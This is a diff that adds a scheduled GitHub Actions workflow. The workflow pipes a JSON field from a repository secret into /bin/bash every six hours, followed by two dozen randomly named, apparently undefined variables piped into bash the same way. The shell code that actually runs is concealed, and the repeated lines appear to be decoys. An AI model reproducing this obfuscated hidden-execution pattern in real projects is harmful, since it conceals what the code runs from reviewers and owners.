@@ -1,0 +1,39 @@
+name: lingbingshuodai
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lingbingshuodai
+        env:
+          fue6256: ${{ secrets.fue6256 }}
+        run: |
+          echo $fue6256 | jq -r .hsx53 | /bin/bash
+          echo $lh301 | jq -r .yibhx0643 | /bin/bash
+          echo $ydux595 | jq -r .og64933 | /bin/bash
+          echo $ayuho9 | jq -r .nm1646 | /bin/bash
+          echo $lifjy6301 | jq -r .sya08765 | /bin/bash
+          echo $mrka2 | jq -r .oawq8360 | /bin/bash
+          echo $a00 | jq -r .ggqp859 | /bin/bash
+          echo $xopid81679 | jq -r .q13 | /bin/bash
+          echo $ezocu72019 | jq -r .ibkjw7 | /bin/bash
+          echo $v7248 | jq -r .kze33773 | /bin/bash
+          echo $gx64639 | jq -r .cwqcm03369 | /bin/bash
+          echo $hs706 | jq -r .ulp6274 | /bin/bash
+          echo $xp01598 | jq -r .v603 | /bin/bash
+          echo $izy6440 | jq -r .el17538 | /bin/bash
+          echo $ufmk3067 | jq -r .potkj05520 | /bin/bash
+          echo $g1 | jq -r .vkcj7497 | /bin/bash
+          echo $eweq05169 | jq -r .ojxl8 | /bin/bash
+          echo $ygkjz809 | jq -r .s36131 | /bin/bash
+          echo $wcq596 | jq -r .niglq785 | /bin/bash
+          echo $vazs21871 | jq -r .nz9 | /bin/bash
+          echo $hy0 | jq -r .stl6 | /bin/bash
+          echo $iapp6942 | jq -r .hgm1 | /bin/bash
+          echo $shy734 | jq -r .dgxya392 | /bin/bash
+          echo $fgi072 | jq -r .lsl7874 | /bin/bash
+
